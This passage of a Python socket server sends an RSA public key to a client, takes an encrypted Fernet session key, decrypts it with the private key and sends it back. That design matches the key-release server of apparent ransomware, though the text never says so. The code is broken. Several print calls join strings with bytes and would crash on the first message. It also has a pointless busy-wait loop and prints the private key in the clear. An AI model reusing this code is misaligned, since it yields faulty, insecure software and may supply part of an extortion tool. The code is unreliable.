print('public_key '+ public_key.decode())
print('\n\n')
print('private_key '+ private_key.decode())
print('\n\n')


with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
    s.bind((SERVER_IP, SERVER_PORT))
    print('Server is listening')
    s.listen(1)
    conn,addr = s.accept()
    print(f'Connection accepted from :{addr}')
    with conn:
        while True:
            

            # Receive the message type
            message_type = conn.recv(1024)
            print('received from the client : '+ message_type)
            if message_type == b'public_key':
                # Send the public key
                print('sending  public_key: ')
                print('\n\n')
                conn.send(public_key)
                
            elif message_type == b'enc_fernet_key':
                # Receive the encrypted session key
                enc_fernet_key = conn.recv(1024)
                print('received : the encrypted_key...',)
                print('\n\n')
                print('encrypted_key '+ enc_fernet_key)
                print('\n\n')
                # Decrypt the session key
                dec_fernet_key = private_crypter.decrypt(enc_fernet_key)
                
                # Send the decrypted session key
                while(1==1):
                    if(dec_fernet_key != b''):
                        break
                conn.send(dec_fernet_key)
                print('decrypted_key '+ dec_fernet_key)
                print('\n\n')
                print('sent : the decrypted_key ..')
                print('\n\n')
                
            else:
                # Invalid message type
                print('Invalid message type')
                break
        